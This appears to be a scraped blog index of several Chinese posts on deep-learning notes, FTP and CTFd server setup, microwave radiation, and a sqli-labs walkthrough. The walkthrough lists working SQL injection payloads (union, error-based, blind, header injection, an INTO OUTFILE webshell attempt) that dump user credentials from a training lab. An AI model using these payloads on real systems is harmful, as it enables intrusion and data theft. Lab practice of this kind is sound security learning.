3维数据的卷积运算与2维数据的卷积运算不同的是，3维数据的卷积运算同时进行多通道的卷积并将结果相加 池化层池化是缩小高、长方向上的空间的运算；包含Max池化和Average池化等 特征 没有要学习的参数 通道数不发生变化 对微小的位置变化具有鲁棒性（健壮） 具有代表性的CNN LeNet 是进行手写数字识别的网络，具有连续的卷积层和池化层，最后经全连接层输出结果 不同点 激活函数不同 LeNet使用sigmoid函数，而现在的CNN主要使用ReLU函数 在缩小中间数据的大小时采用的方法不同 原始的LeNet中使用子采样(subsampling)，而现在的CNN大多使用Max池化 AlexNet 在结构上与LeNet基本没有什么不同 与LeNet的差异 激活函数使用ReLU 使用进行局部正规化的LRN(Local Response Normalization)层 使用Dropout Data Augmentation(数据扩充)基于算法“人为地”扩充输入图像（训练图像），如施加旋转、垂直或水平方向上的移动等微小变化，以此增加图像的数量 加深层的好处 减少网络的参数数量 与没有加深层的网络相比，加深了层的网络可以用更少的参数达到同等水平（或者更强）的表现力 使学习更加高效 随着层的加深，神经元会对更复杂的东西有响应 可以分层次地分解需要学习的问题 可以分层次地传递信息 感受野(receptive field)给神经元施加变化的某个局部空间区域 ImageNet一个拥有超过100万张图像的数据集 在深度学习中比较知名的网络 VGG GoogLeNet ResNet 深度学习中高速化的问题在深度学习中大部分时间都耗费在卷积层上 基于GPU的高速化深度学习中需要进行大量的乘积累加计算，而这正是GPU所擅长的，故可使用GPU来进行深度学习的运算以提高学习速度 分布式学习为了进一步提高深度学习所需的计算的速度，可以考虑在多个GPU或者多台机器上进行分布式计算","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"ftp文件服务器搭建","slug":"ftp_server","date":"2021-12-16T15:03:06.120Z","updated":"2021-12-16T15:15:51.555Z","comments":true,"path":"2021/12/16/ftp_server/","link":"","permalink":"http://uniqueland.top/2021/12/16/ftp_server/","excerpt":"第一步：更新软件列表","text":"第一步：更新软件列表 1234567891011121314zh@ubuntu:~$ sudo apt update[sudo] password for zh: Hit:1 http://cn.archive.ubuntu.com/ubuntu focal InReleaseGet:2 http://cn.archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]Get:3 http://cn.archive.ubuntu.com/ubuntu focal-backports InRelease [108 kB]Get:4 http://cn.archive.ubuntu.com/ubuntu focal-security InRelease [114 kB]Get:5 http://cn.archive.ubuntu.com/ubuntu focal-updates/main amd64 Packages [1,397 kB]Get:6 http://cn.archive.ubuntu.com/ubuntu focal-updates/universe amd64 Packages [883 kB] Fetched 2,615 kB in 10s (271 kB/s) Reading package lists... DoneBuilding dependency tree Reading state information... Done49 packages can be upgraded. Run &#x27;apt list --upgradable&#x27; to see them. 第二步：安装vsftpd1234567891011121314151617181920212223242526272829303132zh@ubuntu:~$ sudo apt install vsftpdReading package lists... DoneBuilding dependency tree Reading state information... DoneThe following additional packages will be installed: ssl-certSuggested packages: openssl-blacklistThe following NEW packages will be installed: ssl-cert vsftpd0 upgraded, 2 newly installed, 0 to remove and 49 not upgraded.Need to get 132 kB of archives.After this operation, 402 kB of additional disk space will be used.Do you want to continue? [Y/n] yGet:1 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 ssl-cert all 1.0.39 [17.0 kB]Get:2 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 vsftpd amd64 3.0.3-12 [115 kB]Fetched 132 kB in 3s (50.0 kB/s) Preconfiguring packages ...Selecting previously unselected package ssl-cert.(Reading database ... 71512 files and directories currently installed.)Preparing to unpack .../ssl-cert_1.0.39_all.deb ...Unpacking ssl-cert (1.0.39) Selecting previously unselected package vsftpd..............................................................................] Preparing to unpack .../vsftpd_3.0.3-12_amd64.deb ...Unpacking vsftpd (3.0.3-12) ...######################.......................................................................] Setting up ssl-cert (1.0.39) ...#################################...........................................................] Progress: [ 56%] [##########################################################................................................] Setting up vsftpd (3.0.3-12) ...########################################################....................................] Created symlink /etc/systemd/system/multi-user.target.wants/vsftpd.service → /lib/systemd/system/vsftpd.service.............] Processing triggers for man-db (2.9.1-1) Processing triggers for systemd (245.4-4ubuntu3.11) ... 第三步：添加用户123456zh@ubuntu:~$ sudo nano /etc/vsftpd.confzh@ubuntu:~$ sudo useradd -m ftpuserzh@ubuntu:~$ sudo passwd ftpuserNew password: Retype new password: passwd: password updated successfully 第四步：测试1root@ubuntu:/home/zh# echo &quot;TEST&quot; &gt; ../ftpuser/test.txt","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://uniqueland.top/tags/linux/"}]},{"title":"Deep Learning from Scratch 3","slug":"deep_learning_from_scratch_3","date":"2021-12-11T08:29:42.485Z","updated":"2021-12-12T01:39:50.058Z","comments":true,"path":"2021/12/11/deep_learning_from_scratch_3/","link":"","permalink":"http://uniqueland.top/2021/12/11/deep_learning_from_scratch_3/","excerpt":"误差反向传播法","text":"误差反向传播法 Affine 层（仿射变换） 神经网络的正向传播中进行的矩阵的乘积运算在几何学领域被称为“仿射变换” ​ 注：在affine层的反向传播过程中要注意矩阵形状 梯度确认(gradient check) 确认数值微分求出的梯度结果和误差反向传播法求出的结果是否一致的操作 ​ 用于确认误差反向传播法的实现是否正确 与学习相关的技巧最优化 解决“寻找最优参数的问题”的过程 SGD $$W= W-η\\frac{\\partial L}{\\partial W}$$ 缺点 如果函数的形状非均向(anisotropic)，搜索的路径就会非常低效 抵消的根本原因：梯度的方向并没有指向最小值的方向 Momentum $$v=\\alpha v - \\eta \\frac{\\partial L}{\\partial W}$$ $$W=W+v$$ AdaGrad $$h=h+\\frac{\\partial L}{\\partial W} .\\frac{\\partial L}{\\partial W}$$ $$W=W-\\eta \\frac{1}{h^{\\frac{1}{2}}}\\frac{\\partial L}{\\partial W}$$ ​ AdaGrad会记录过去所有梯度的平方和。因此，学习越深入，更新的幅度就越小。实际上，如果无止境的学习，更新量就会变成零 Adam 融合了Momentum和AdaGrad方法。通过组合前面两个方法的优点，有望实现参数空间的高效搜索 特征：超参数的“偏置校正” 权重的初始值​ 将权重设置为0的问题 ​ 如果将权重设置为零，那么下一层的神经元会杯传递相同的值，从而达不到学习的效果（乘法反向传播的例子），则在反向传播时第二层的权重进行同样的更新，这使得神经网络拥有许多不同的权重的意义丧失了。即防止“权重均一化”（瓦解权重的对称结构） 梯度消失（梯度爆炸）在运用链式法则时，由于运算时以连乘的形式进行，所以当层数很深时，随着层数的增加，计算出的梯度会指数级变化，如果是往小了变，就出现了梯度消失现象，如果是往大了变，就出现了梯度爆炸现象 表现力受限当传递给神经元的是有所偏向的数据时，有可能会出现表现力受限的问题，即多个神经元输出相同的结果，那同样可以由一个神经元完成的事情无疑令这些神经元的存在变得无意义 Xavier初始值 如果前一层的节点数为n，则初始值使用标准差为1/(n^(1/2))的分布 ReLU的权重初始值 当激活函数使用ReLU时，一般推荐使用ReLU专用的初始值，也称为“He初始值” He初始值使用标准差为(2/n)^(1/2)的高斯分布 Batch Nomalization (Batch Norm) 以进行学习时的mini-batch为单位，按mini-batch进行正规化 进行使数据分布的均值为0，方差为1的正规化$$\\mu B=\\frac{1}{m}\\Sigma^m{i=1}x_i$$ $$\\sigma ^2_B=\\frac{1}{m}\\Sigma^m_{i=1}(x_i-\\mu_B)^2$$ $$x_i=\\frac{x_i-\\mu_B}{\\sqrt{\\sigma_B^2+\\epsilon}}$$ 优点： 可以使学习快速进行（可以增大学习率） 不那么依赖初始值（对于初始值不用那么神经质） 抑制过拟合（降低Dropou等的必要性） 过拟合 只能拟合训练数据，但不能很好地拟合不包含在训练数据中的其他数据的状态 原因 模型拥有大量参数，表现力强 训练数据少 权值衰减 通过在学习的过程中对大的权重进行惩罚，来抑制过拟合 例：为损失函数加上权重的平方范数（1/2λW^2） Dropout Dropout是一种在学习的过程中随机删除神经元的方法。训练时，随机选出隐藏层的神经元，然后将其删除。被删除的神经元不再进行信号的传递","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"微波炉究竟有没有辐射","slug":"microwave_oven","date":"2021-11-30T15:24:20.874Z","updated":"2021-12-06T15:39:31.281Z","comments":true,"path":"2021/11/30/microwave_oven/","link":"","permalink":"http://uniqueland.top/2021/11/30/microwave_oven/","excerpt":"震惊！这个常见的家用电器竟有这么大的辐射","text":"震惊！这个常见的家用电器竟有这么大的辐射 直奔主题，微波炉对人体究竟会不会产生危害要知道微波炉是否会对人体产生危害，就得先知道什么程度的微波会对人体产生危害 可以看出，只要50mm以外泄露的微波小于等于50W/m^2，就不会对人体造成影响，而市面上的绝大多数微波炉也都满足这一标准，即使在使用了一段时间后，虽然门把手及炉门密封处微波泄漏量略有上升，但也都在标准以内 顺便说一声，微波炉的产生的辐射属于非电离辐射，并不能破坏分子结构和产生电离作用；频率在2.45GHz左右，也就WIFI的频率，而且微波炉是在金属容器中工作的，这些金属容器能够很好地限制微波 所以，微波炉不会对人体造成伤害 问题解答微波炉泄漏的辐射会致畸？ 点击查看答案 同样是2.45GHz左右的频率，既然WIFI没有致畸作用，想必微波炉也不具备这样的能力 微波炉加热食物会产生致癌物质？ 点击查看答案 想知道是否致癌，得从微波炉加热的本质说起微波炉加热的其实是食物中的水。当微波辐射到食品上时，水的极性分子的取向将随微波场而变动。由于食品中水的极性分子的这种运动，以及相邻分子间的相互作用，产生了焦耳热，从而加热食物，所以微波炉加热不会产生致癌物质 微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？ 点击查看答案 来人，上公式可以看出微波的波长大概在12cm左右，比微波炉门上的小洞直径大得多，微波根本出不来 微波炉加热的食品，会不会改变食品本身的营养成分？ 点击查看答案 我们要明白的是：任何形式的烹饪都会破坏食物中的营养成分，但关键的变量是烹饪中所用水的多少，烹饪的时间，以及温度。正常的微波烹饪由于时间短，避免了传统烹饪中食物表面温度过高的弊端，油烟更少，所以产生的致癌物也更少。而且，在烹饪方法中，微波炉加热对食品营养成分的保护是属于比较好的，“能最大限度地保留食品的营养及原有的色香味”。 资料参考： 求真测试：微波炉辐射大？比手机大多了|食品|微波炉|微波_新浪科技_新浪网 (sina.com.cn) 老爸评测：让我们谈谈关于微波炉的辐射问题_微波炉_什么值得买 (smzdm.com) 部分图源必应，侵删","categories":[],"tags":[{"name":"other","slug":"other","permalink":"http://uniqueland.top/tags/other/"}]},{"title":"sqli-labs","slug":"sqli-labs","date":"2021-11-30T05:33:41.039Z","updated":"2022-01-02T03:04:14.353Z","comments":true,"path":"2021/11/30/sqli-labs/","link":"","permalink":"http://uniqueland.top/2021/11/30/sqli-labs/","excerpt":"用校园网可能不能成功发送payload，切记！！！","text":"用校园网可能不能成功发送payload，切记！！！ Less-01 先判断是字符型注入还是数字型注入 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1 and 1=2–+ 再判断注入点 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,2,3–+ 查看数据库名称 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,database(),3–+ 查看库中的表 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+ 查看用户表中字段 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=”users”–+ 查看用户名和密码 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(username,password),3 from security.users–+ 换个方式显示 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(username),group_concat(password) from security.users–+ Less-02 判断是数字型注入还是字符型注入 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1 判断注入点 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+ 往下操作与第一题类似，payload就差了一个单引号 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-03 判断为字符型注入还是数字型注入 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1 该题为字符型注入，但直接使用联合注入报错 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+ 根据题目提示，在id表示的数据及引号后加上括号，再进行联合注入，注入成功 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+ 往下与第一题相同，union后的payload一致 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-04 判断为字符型注入还是数字型注入 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1 使用单引号进行闭合，报错 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+ 组合单引号、双引号以及括号得到注入点 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;) union select 1,2,3–+ 往下步骤与上述题目相同 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-05 判断为字符型注入还是数字型注入 回显报错数据，尝试盲注 payload：http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27%20and%20select%201,2,3--+ 对查询结果进行切片，再与各个字符比较，根据报错与否判断比较结果 payload：http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+ 改变上一个payload中c的值以遍历出数据库名称，再结合前面题目的payload逐步爆出表名和列名 payload：http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22),1,1)=%27e%27--+ 列名以此类推 可以用python写个脚本来跑，或者使用burpsuite 另外，还可以使用updataxml()函数来获取相关信息 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+ Less-06与上一道题类似，将单引号换为双引号 Less-07 利用永真永假的条件配合and和or判断参数id的闭合方式 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+ 利用select xxx into outfile xxx/xxx的方式向服务器中写入文件，文件内容为一句话木马 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;)) union select 1,’2’,”“ into outfile “./“ –+ 由于不知道网站的根目录，所以目前无法对传入文件的成功与否做出判断 Less-08 判断参数闭合方式 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+ 由于注入错误时不回显，因此可以使用上述的盲注 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+ 往后步骤与上述盲注步骤一致 Less-09 在判断参数闭合方式时，发现回显不改变 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+ 尝试基于时间的盲注 可以看到网页根据设定的时间正在加载，说明注入成功 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+ 接下来只需要将sleep函数的第一个参数替换为payload，即可根据网页响应时间判断结果 payload取上述盲注payload的查询部分 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+ Less-10 将闭合参数的单引号替换为双引号，其余一致 Less-11这道题是使用post方式提交数据的，在多次尝试以及上网找资料之后，发现有两点需要注意 不可以直接将url编码之后的数据（如%20）直接提交 最后的注释不可以用“–+”，而应该用“#” 上面这样注释是行不通的，用“#”代替“–+”之后如下图 然后再用之前写过的题当中出现的联合注入 Less-12原理同上一题一致，唯一差别是闭合方式不同 less-13这道题的闭合方式与上一道题目比较相似，只不过把双引号替换为单引号，比较不一样的是这道题不可以使用上一道题的联合注入，可以使用报错注入，具体的payload可参照上述题目有关报错注入的部分 下图是联合注入后无回显的结果 这里使用了报错注入返回了mysql的绝对路径 payload：1’) and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)# 这里查询到了当前的数据库 需要注意的是由于返回长度的限制，回显无法显示所有的结果，可以根据payload作相应调整 payload：1’) and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users),0x7e),1)# Less-14这道题与上一道题类似，唯一不同的仍是闭合方式不同 Less-15这道题考察的是post方式的基于时间的盲注 一开始依然先判断闭合方式 然后用if语句构造基于时间的盲注 这里无需关注是否登录成功，只需关注响应时间 然后根据上述题目中有关基于时间的盲注有关的题目的payload进行注入 payload：1’ or if((substr((select group_concat(schema_name) from information_schema.schemata),1,1)=’c’),sleep(2),1) # Less-16这道题与上一道题目差不多，唯一区别仍是闭合方式不同 Less-17这道题涉及到了sql语句中update部分，模拟的是在登录成功后修改密码时的注入 这里由于无法回显闭合方式是否正确，故使用基于时间的盲注中的小技巧进行判断 往下的过程涉及到子查询的概念，即以查询的结果作为下一次查询的范围 查数据库 往后只需将select database()替换为先前题目中相应的payload即可 Less-18一开始给出了本机的ip地址，意义不明（估计是提示可以注入某些类型的信息以执行） 再经过对username和password的多次注入后发现没有什么效果，尝试登录 可以看出登录后回显了user agent，则可以通过抓包修改user agent的方式注入 payload：’and updatexml(1,concat(0x7e,database(),0x7e),1) or ‘ Less-19这道题与上一道差不多，只不过修改的是Referer字段 payload：与上一道题一致","categories":[],"tags":[{"name":"ctf、web","slug":"ctf、web","permalink":"http://uniqueland.top/tags/ctf%E3%80%81web/"}]},{"title":"Deep Learning from Scratch 2","slug":"deep_learning_from_scratch_2","date":"2021-11-29T14:46:25.122Z","updated":"2021-12-05T02:56:57.166Z","comments":true,"path":"2021/11/29/deep_learning_from_scratch_2/","link":"","permalink":"http://uniqueland.top/2021/11/29/deep_learning_from_scratch_2/","excerpt":"在”手写数字识别”中","text":"在”手写数字识别”中 了解到了mnist数据集 对运算过程中运算的具体对象有点问题 1234567891011import sys, ossys.path.append(os.pardir)from dataset.mnist import load_mnist(x_train, t_train), (x_test, t_test) = load_mnist(flatten=True, normalize=False) #一开始不知道这是什么意思print(x_train.shape)print(t_train.shape)print(x_test.shape)print(t_test.shape) 对于代码中出现的两个元组，一开始不知道 t_train t_test 代表什么，在纠结了一段时间后终于明白了 x_train 是训练用的图像数据 t_train 是训练图像的解，即每个图像对应的数字 x_test 是用于测试的图像数据 t_test 是测试图像的解，即每个图像对应的数字 认识了正规化、预处理和 one-hot 表示法 正规化指的是将数据进行转化，如对图像的每个像素数值除以256，使其数值在0到1之间，方便后续运算 预处理，顾名思义，就是在运算之前对数据进行转换，如正规化等 one-hot 表示法是指对运算结果只将 解 所对应的值设为1，即将 解 作为索引，设置该索引的值为1；在对图像进行预测的脚本中，获取解的过程便是基于one-hot表示法的，如下 p= np.argmax(y) 12345for i in range(len(x)): y = predict(network, x[i]) p= np.argmax(y) # 获取概率最高的元素的索引 if p == t[i]: accuracy_cnt += 1 另外，在阅读到设计神经网络时，学到了有关输入层和输出层与数据之间的关系 输入层为待训练数据的大小，如训练手写数字识别时输入层为784，即为训练图像的大小 输出层为分类数目，如训练的手写数字结果只有0到9十种可能，故将输出层设为十 在“从数据中学习”中 认识了许多概念 特征量 特征量是指可以从输入数据中准确地提取本质数据的转换器，通常表示为向量形式 特征量是由人设计的 不同问题对应不同特征量 深度学习中特征量是由机器来学习的 泛化能力 泛化能力是指处理未被观察过的数据（不包含在训练数据中的数据）的能力 过拟合 只对某个数据集过度拟合的状态称为过拟合 可以理解为训练的模型只对某个数据集起作用 损失函数 损失函数是表示神经网络性能的“恶劣程度”的指标，即当前的神经网络对监督数据在多大程度上不拟合，在多大程度上不一致 均方误差$$E=\\frac{1}{2}\\Sigma_k(y_k-t_k)^2$$ 这里y_k表示神经网络的输出，t_k表示监督数据，k表示数据维数 交叉熵误差$$E=-\\Sigma_kt_k\\log{y_k}$$ 损失函数的意义个人认为，损失函数存在的意义是作为模型调参结果的重要指标，由于测试精度的变化是不连续的（因为测试数据有限，测试结果的精度就取决于测试数据的多少），故无法体现模型调参后微小的变化，而损失函数是连续的，任何微小的改动都可能改变损失函数的结果（可以认为损失函数的精度比测试结果的精度高得多），故需要损失函数来衡量调参后的结果 数值微分 利用某个给定的微小值的差分求导数的过程，称为数值微分 导数与偏导数的定义 梯度及梯度法 梯度法：函数的取值从当前位置沿着梯度方向前进一段距离，然后在新的地方重新求梯度，再沿着新梯度方向前进，逐渐减小函数值 学习算法（随机梯度下降法）的实现神经网络的学习步骤： 前提 神经网络存在合适的权重和偏置，调整权重和偏置以便拟合训练数据的过程称为“学习” 步骤1（mini-batch） 从训练数据中随机选出一部分数据，这部分数据称为mini-batch。我们的目标是减小mini-batch的损失函数的值 步骤2（计算梯度） 为了减小mini-batch的损失函数的值，需要求出各个权重参数的梯度。梯度表示损失函数的值减小最多的方向 步骤3（更新参数） 将权重参数沿梯度方向进行微小更新 步骤4（重复） 重复步骤1、步骤2、步骤3 epoch： epoch是一个单位，一个epoch表示学习中所有训练数据均被使用过一次时的更新次数 误差方向传播法计算图了解正向传播、反向传播及局部计算的定义 链式法则复合函数导数的定义 如果某个函数由复合函数表示，则该复合函数的导数可以用构成复合函数的各个函数的导数的乘积表示 链式法则是关于复合函数的导数的性质 反向传播反向传播的计算顺序 先将节点的输入信号乘以节点的局部导数（偏导数），然后传递给下一个节点 加法节点的反向传播 加法节点的反向传播只乘以1 乘法节点的反向传播 乘法节点的反向传播会将上游的值乘以正向传播时的输入信号的“翻转值”后传递给下游 对翻转值的理解：书上说的是“表示一种翻转关系”，个人认为是参与运算的另一个值，以乘法为例：乘法涉及到两个值，则传播到某一个方向的值为上游的值乘以参与运算的另一个对象的值","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"CTFd搭建","slug":"ctf_contest_platform_build","date":"2021-11-28T09:32:15.439Z","updated":"2021-11-28T09:35:07.152Z","comments":true,"path":"2021/11/28/ctf_contest_platform_build/","link":"","permalink":"http://uniqueland.top/2021/11/28/ctf_contest_platform_build/","excerpt":"CTF比赛平台搭建","text":"CTF比赛平台搭建 克隆CTFdGitHub：https://github.com/CTFd/CTFd 123456789┌──(kali㉿kali)-[/var/www/html]└─$ sudo git clone https://github.com/CTFd/CTFd.git 128 ⨯Cloning into &#x27;CTFd&#x27;...remote: Enumerating objects: 14012, done.remote: Counting objects: 100% (869/869), done.remote: Compressing objects: 100% (555/555), done.remote: Total 14012 (delta 480), reused 578 (delta 291), pack-reused 13143Receiving objects: 100% (14012/14012), 25.84 MiB | 1.69 MiB/s, done.Resolving deltas: 100% (8691/8691), done. 安装docker12┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ sudo apt install docker docker-compose 1234567┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ docker --versionDocker version 20.10.8+dfsg1, build 3967b7d ┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ docker-compose --versiondocker-compose version 1.27.4, build unknown 添加执行权限12┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ sudo chmod +x /usr/bin/docker-compose 在CTFd根目录下启动docker123456789101112131415161718192021┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ sudo docker-compose up -d 130 ⨯Creating network &quot;ctfd_internal&quot; with the default driverCreating network &quot;ctfd_default&quot; with the default driverPulling db (mariadb:10.4.12)...10.4.12: Pulling from library/mariadb23884877105a: Pull completebc38caa0f5b9: Pull complete2910811b6c42: Pull complete36505266dcc6: Pull completee69dcc78e96e: Pull complete222f44c5392d: Pull completeefc64ea97b9c: Pull complete9912a149de6b: Pull complete7ef6cf5b5697: Pull complete8a05be3688e0: Pull completec09ffdc1b660: Pull complete2eb7fe288fc8: Pull completeb41d1cc4d40f: Pull completea92376500910: Pull complete...... 注：首次启动由于下载依赖等会比较慢 平台配置打开浏览器，输入127.0.0.1:8000配置赛事相关信息 添加题目在GitHub上找题目，clone到本地 1234567┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]└─$ sudo git clone https://github.com/CTFTraining/CTFTraining.gitCloning into &#x27;CTFTraining&#x27;...remote: Enumerating objects: 86, done.remote: Total 86 (delta 0), reused 0 (delta 0), pack-reused 86Receiving objects: 100% (86/86), 31.72 KiB | 331.00 KiB/s, done.Resolving deltas: 100% (48/48), done. 实际测试发现不能把所有的题目都clone下来，就先试一道题 1234567┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]└─$ sudo git clone https://github.com/CTFTraining/0ctf_2016_unserialize.git 128 ⨯Cloning into &#x27;0ctf_2016_unserialize&#x27;...remote: Enumerating objects: 32, done.remote: Total 32 (delta 0), reused 0 (delta 0), pack-reused 32Receiving objects: 100% (32/32), 779.15 KiB | 2.07 MiB/s, done.Resolving deltas: 100% (3/3), done. docker images 命令查看已有镜像 docker build ./ -t [镜像名称] 启动Dockerfile文件，创建镜像 12345678910111213141516┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker build ./ -t 0ctf_2016_unserialize Sending build context to Docker daemon 1.841MBStep 1/8 : FROM php:5.6-fpm-alpine5.6-fpm-alpine: Pulling from library/php169185f82c45: Pull complete 8ba0d98519aa: Pull complete 75f762bbc102: Pull complete 04f939cd9fe5: Pull complete 5feedbe48aa1: Pull complete 47e0f87348c0: Pull complete 68b7fb9d3c14: Pull complete 7e4b086d6b5d: Pull complete a15e624700d4: Pull complete f714654cc532: Pull complete Digest: sha256:e3845c650c700234be3fb5b94865753d1a4534f8820d4dea1d0ee6d875efe02b 123456789101112┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker images 1 ⨯REPOSITORY TAG IMAGE ID CREATED SIZE0ctf_2016_unserialize latest 931233916db0 2 minutes ago 333MBctfd_ctfd latest b36ee26f2439 49 minutes ago 791MBpython 3.7-slim-buster cd7d26aa86ac 10 days ago 113MBnginx 1.17 9beeba249f3e 18 months ago 127MBmariadb 10.4.12 b6184b68d1fd 19 months ago 357MBredis 4 191c4017dcdd 19 months ago 89.3MBubuntu 18.10 9dc19675e327 2 years ago 67.3MBphp 5.6-fpm-alpine 6feac8f2ef42 2 years ago 54.5MBphp 5-apache-jessie d34f09f63596 2 years ago 374MB 再通过镜像创建容器： 12┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker run --name 0ctf_2016_unserialize -p 20000:80 -d 0ctf_2016_unserialize 查看现有容器： 12345678┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES9cae78cf79bc 0ctf_2016_unserialize &quot;docker-php-entrypoi…&quot; 5 seconds ago Up 4 seconds 9000/tcp, 0.0.0.0:20000-&gt;80/tcp, :::20000-&gt;80/tcp 0ctf_2016_unserialize3b3889db12c7 nginx:1.17 &quot;nginx -g &#x27;daemon of…&quot; 57 minutes ago Up 57 minutes 0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp ctfd_nginx_17b58b9661715 ctfd_ctfd &quot;/opt/CTFd/docker-en…&quot; 57 minutes ago Up 57 minutes 0.0.0.0:8000-&gt;8000/tcp, :::8000-&gt;8000/tcp ctfd_ctfd_193e49564bff7 mariadb:10.4.12 &quot;docker-entrypoint.s…&quot; 57 minutes ago Up 57 minutes ctfd_db_19f4380eb4639 redis:4 &quot;docker-entrypoint.s…&quot; 57 minutes ago Up 57 minutes 访问127.0.0.1:20000即可访问到刚刚添加的题目，20000是刚刚指定的端口 打开题目容器： 1docker exec -i -t &lt;container&gt; /bin/sh 为题目添加flag： 1234567┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker exec -i -t 0ctf_2016_unserialize /bin/sh 1 ⨯/var/www/html # lsclass.php config.php index.php profile.php register.php static update.php upload www.zip/var/www/html # echo flag&#123;an_e@sy_un5eri@li2e_chall3nge&#125; &gt; flag.txt/var/www/html # lsclass.php config.php flag.txt index.php profile.php register.php static update.php upload www.zip 最后在后台添加题目地址等信息 